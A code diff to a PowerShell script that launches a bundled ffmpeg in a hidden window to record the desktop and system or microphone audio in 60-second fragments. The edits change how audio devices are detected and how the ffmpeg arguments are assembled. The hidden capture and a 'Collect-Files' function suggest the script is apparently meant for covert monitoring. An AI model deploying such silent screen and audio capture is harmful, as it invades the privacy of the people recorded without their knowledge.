@@ -70,32 +70,32 @@ function Collect-Files {
 function Get-AudioDevice {
     $ffmpeg = "$PSScriptRoot\ffmpeg.exe"
     $raw = & $ffmpeg -list_devices true -f dshow -i dummy 2>&1
-
     $devices = @()
+
     foreach ($line in $raw) {
-        if ($line -match '"(.+?)"\s+\(audio\)') {
+        if ($line -match '^\[dshow @.*?\] +"(.+?)"\s+\(audio\)') {
             $devices += $matches[1]
         }
     }
 
     if ($devices.Count -eq 0) {
-        Write-Warning "No available audio devices found"
+        Write-Warning "No audio devices found."
         return $null
     }
 
-    $preferred = "Microphone"
-    $selected = $devices | Where-Object { $_ -eq $preferred }
-
-    if (!$selected) {
-        Write-Warning "Preferred device not found: $preferred"
-        $selected = $devices[0]
-        Write-Output "Using fallback audio device: $selected"
-    } else {
-        Write-Output "Using preferred audio device: $selected"
+    $preferred = @("CABLE", "Stereo", "Mix", "Virtual", "Line", "Microphone", "Input")
+    foreach ($keyword in $preferred) {
+        foreach ($device in $devices) {
+            if ($device -like "*$keyword*") {
+                return "`"$device`""
+            }
+        }
     }
 
-    return $selected
+    return "audio=`"$($devices[0])`""
 }
+
+
 
 
 
@@ -108,53 +108,42 @@ function Start-Recording {
     }
 
     $audioDevice = Get-AudioDevice
-    if (-not $audioDevice) {
-        Write-Warning "No audio device detected, recording video only."
-    }
-
     $file = "$recordingDir\frag_$(Get-Date -Format 'yyyyMMdd_HHmmss').mp4"
 
     $args = @(
         "-y",
-        "-f", "gdigrab",
-        "-framerate", "15",
-        "-i", "desktop"
+        "-f", "gdigrab", "-framerate", "15", "-i", "desktop"
     )
 
     if ($audioDevice) {
+        $args += @("-f", "dshow", "-i", "audio=$audioDevice")
+        $args += @("-map", "0:v:0", "-map", "1:a:0")
         $args += @(
-            "-f", "dshow",
-            "-i", "audio=$audioDevice",
-            "-map", "0:v:0",
-            "-map", "1:a:0"
+            "-vcodec", "libx264", "-preset", "veryfast",
+            "-acodec", "aac", "-ar", "44100", "-b:a", "128k"
         )
     } else {
-        Write-Warning "No audio input, video only."
-        $args += "-map", "0:v:0"
-        $args += "-an"
+        Write-Warning "No audio device available, recording video only."
+        $args += @("-map", "0:v:0", "-an")
+        $args += @("-vcodec", "libx264", "-preset", "veryfast")
     }
 
-    $args += @(
-        "-vcodec", "libx264",
-        "-preset", "veryfast",
-        "-acodec", "aac",
-        "-ar", "44100",
-        "-b:a", "128k",
-        "-t", "60",
-        "$file"
-    )
+    $args += @("-t", "60", "$file")
 
     Write-Output "Launching ffmpeg..."
+    Write-Output "FFmpeg arguments: $($args -join ' ')"
+
     try {
         $process = Start-Process -FilePath $ffmpeg -ArgumentList $args -WindowStyle Hidden -PassThru
         $global:ffmpegProcess = $process
         Write-Output "ffmpeg started with PID: $($process.Id)"
 
-        $timeout = 10
+        $timeout = 60
         while ($timeout -gt 0 -and !(Test-Path $file)) {
             Start-Sleep -Seconds 1
             $timeout--
         }
+
 
         if (Test-Path $file) {
             Write-Output "Recording file created: $file"
@@ -167,7 +156,9 @@ function Start-Recording {
         Write-Warning "Failed to start recording: $_"
         return
     }
+
 }
+
 
 
 
